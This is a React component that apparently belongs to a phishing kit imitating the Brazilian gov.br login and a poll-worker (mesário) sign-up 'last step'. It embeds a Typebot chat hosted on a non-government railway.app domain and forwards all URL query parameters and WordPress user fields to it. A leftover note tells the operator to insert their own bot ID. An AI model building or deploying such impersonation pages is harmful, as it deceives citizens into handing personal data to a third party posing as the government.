import { useEffect, useRef } from "react";

declare global {
  interface Window {
    typebotWpUser?: {
      "WP ID": string;
      "WP Username": string;
      "WP Email": string;
      "WP First name": string;
      "WP Last name": string;
    };
  }
}

export default function Chat() {
  const containerRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    // Inicializar variáveis do Typebot
    if (typeof window.typebotWpUser === "undefined") {
      window.typebotWpUser = {
        "WP ID": "0",
        "WP Username": "",
        "WP Email": "",
        "WP First name": "",
        "WP Last name": "",
      };
    }

    // Criar o elemento customizado do Typebot
    if (containerRef.current) {
      const typebotElement = document.createElement("typebot-standard");
      typebotElement.setAttribute("id", "clqxvxvxr0001jv0fxvxvxvxv");
      typebotElement.style.width = "100%";
      typebotElement.style.height = "550px";
      typebotElement.style.display = "block";
      containerRef.current.appendChild(typebotElement);
    }

    // Carregar o script do Typebot
    const script = document.createElement("script");
    script.type = "module";
    script.innerHTML = `
      import Typebot from "https://cdn.jsdelivr.net/npm/@typebot.io/js@0.2/dist/web.js"

      const urlParams = new URLSearchParams(window.location.search);
      const queryParams = Object.fromEntries(urlParams.entries());

      Typebot.initStandard({ 
        apiHost: "https://viewer-production-c57f.up.railway.app",
        id: "clqxvxvxr0001jv0fxvxvxvxv", 
        typebot: "gov-fpgre-ar546oc",
        prefilledVariables: { ...window.typebotWpUser, ...queryParams }
      });
    `;
    document.body.appendChild(script);

    return () => {
      // Cleanup
      if (script.parentNode) {
        script.parentNode.removeChild(script);
      }
    };
  }, []);

  return (
    <>
      <header>
        <a href="#">
          <img src="/images/govbr.png" alt="Logomarca GovBR" />
        </a>
        <div id="acessibilidade">
          <span>
            <a href="#">
              <i className="fa fa-adjust"></i>
              <span>Alto Contraste</span>
            </a>
          </span>
          <span>
            <a href="#">
              <i className="fa fa-deaf"></i>
              <span>VLibras</span>
            </a>
          </span>
        </div>
      </header>

      <div className="container">
        <aside id="aside-signin">
          <img
            id="identidade-govbr"
            src="/images/conta_govbr_v2.jpg"
            alt="Logomarca GovBR"
          />
        </aside>

        <main id="main-signin">
          <div className="card" id="login-cpf">
            <h3>Última Etapa - Confirmação via Chat</h3>
            <p>
              Agora vamos confirmar sua zona eleitoral e as datas disponíveis
              através do nosso assistente virtual.
            </p>

            <div
              style={{
                backgroundColor: "#f8f9fa",
                padding: "20px",
                borderRadius: "8px",
                marginTop: "20px",
                minHeight: "550px",
                border: "1px solid #ddd",
              }}
            >
              {/* Container do Typebot */}
              <div ref={containerRef} style={{ width: "100%", height: "550px" }}></div>
            </div>

            <p
              style={{
                marginTop: "20px",
                fontSize: "13px",
                color: "#666",
                textAlign: "center",
              }}
            >
              Nosso assistente irá confirmar seus dados e finalizar sua inscrição
              como mesário.
            </p>

            <div
              style={{
                marginTop: "30px",
                padding: "15px",
                backgroundColor: "#e8f5e9",
                borderRadius: "5px",
                fontSize: "13px",
              }}
            >
              <p style={{ margin: 0 }}>
                <strong>Observação:</strong> Para que o chat funcione corretamente,
                você precisa configurar o ID do seu Typebot. Edite o arquivo{" "}
                <code>Chat.tsx</code> e substitua os seguintes valores:
                <br />
                <br />
                • <strong>id:</strong> ID do seu Typebot
                <br />
                • <strong>typebot:</strong> Nome/slug do seu bot
                <br />• <strong>apiHost:</strong> URL da sua instância do Typebot
                (se aplicável)
              </p>
            </div>
          </div>
        </main>
      </div>

      <footer></footer>
    </>
  );
}
